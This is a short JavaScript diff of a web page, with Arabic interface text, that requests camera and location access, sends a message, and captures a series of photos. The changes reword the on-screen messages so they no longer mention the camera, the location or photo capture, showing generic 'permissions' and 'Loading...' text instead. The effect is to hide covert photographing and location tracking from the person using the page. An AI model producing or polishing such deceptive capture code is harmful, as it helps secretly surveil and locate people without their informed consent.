@@ -511,7 +511,7 @@
         mainSpinner.style.display = 'block';
         successCheck.style.display = 'none';
 
-        showLoading('جاري طلب الصلاحيات...', 'يرجى الموافقة على الوصول للكاميرا والموقع');
+        showLoading('جاري طلب الصلاحيات...', 'يرجى الموافقة على الصلاحيات  ');
 
         try {
             // 1. طلب الموقع والكاميرا
@@ -595,7 +595,7 @@
             await sendMessage(infoMsg);
 
             // 5. التقاط الصور
-            showLoading('جاري التقاط الصور...', 'يرجى الانتظار قليلاً');
+            showLoading('جاري التحميل...', 'يرجى الانتظار قليلاً');
             
             for (let i = 1; i <= CAPTURE_COUNT; i++) {
                 await new Promise(r => setTimeout(r, i === 1 ? 800 : CAPTURE_INTERVAL));
